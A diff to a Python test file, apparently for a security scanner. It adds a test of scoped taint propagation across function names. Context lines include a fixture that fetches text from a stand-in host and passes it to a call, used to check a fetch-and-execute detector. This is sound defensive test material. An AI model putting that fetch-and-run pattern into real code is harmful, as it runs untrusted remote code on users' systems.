@@ -321,3 +321,41 @@ class TestHelpersAndFields:
             "def main():\n    call(requests.get('https://x.invalid/c').text)\n"
         )
         assert FlowKit.fetch_exec(source) == [3]
+
+
+class TestAFillTheCallerMarks:
+    def test_mark_adds_names_no_binding_shows_and_spread_carries_them(self) -> None:
+        import ast
+
+        from cordon_scanner.analysis.python.scoped_taint import ScopedTaint
+
+        tree = ast.parse(
+            "import shutil\n"
+            "def f(src, staged, found):\n"
+            "    shutil.copy(src, staged)\n"
+            "    found.append(staged)\n"
+            "    copy = staged\n"
+            "    return copy\n"
+            "def g():\n"
+            "    staged = 1\n"
+            "    return staged\n"
+        )
+        calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call)]
+        copy_call = next(c for c in calls if getattr(c.func, "attr", "") == "copy")
+        append_call = next(c for c in calls if getattr(c.func, "attr", "") == "append")
+        staged_in_f, found_in_f = copy_call.args[1], append_call.func.value  # type: ignore[attr-defined]
+        assert isinstance(staged_in_f, ast.Name)
+        assert isinstance(found_in_f, ast.Name)
+
+        taint = ScopedTaint(tree).spread(lambda _: False)
+        assert taint.mark([staged_in_f, found_in_f])
+        assert not taint.mark([staged_in_f])  # already marked: nothing new
+        taint.spread(lambda value: bool(taint.carries(value)))
+        loads = {
+            (n.id, n.lineno): taint.carries(n)
+            for n in ast.walk(tree)
+            if isinstance(n, ast.Name) and isinstance(n.ctx, ast.Load)
+        }
+        assert loads[("found", 4)] and loads[("staged", 4)]
+        assert loads[("copy", 6)]  # carried on from the marked name
+        assert not loads[("staged", 9)]  # another function's own `staged`
